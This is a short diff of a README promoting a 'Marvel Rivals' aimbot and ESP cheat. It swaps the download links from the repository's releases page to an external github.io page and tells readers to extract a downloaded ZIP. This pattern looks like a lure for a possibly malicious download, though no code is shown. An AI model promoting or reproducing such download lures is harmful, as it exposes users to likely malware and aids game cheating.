@@ -1,9 +1,9 @@
 
-# 🚀 Marvel Rivals Cheat - Ultimate Aimbot & ESP Tool 2025 **[![Download Marvel Rivals Cheat](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blueviolet)](../../releases)**
+# 🚀 Marvel Rivals Cheat - Ultimate Aimbot & ESP Tool 2025 **[![Download Marvel Rivals Cheat](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blueviolet)](https://abdullahei07.github.io/Marvel-Rivals-2025Cheat/)**
 
 ## Quick Installation
 To get started with Marvel Rivals Cheat, follow these simple steps:
-1. **[![Download Marvel Rivals Cheat](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blueviolet)](../../releases)**
+1. **[![Download Marvel Rivals Cheat](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blueviolet)](https://abdullahei07.github.io/Marvel-Rivals-2025Cheat/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
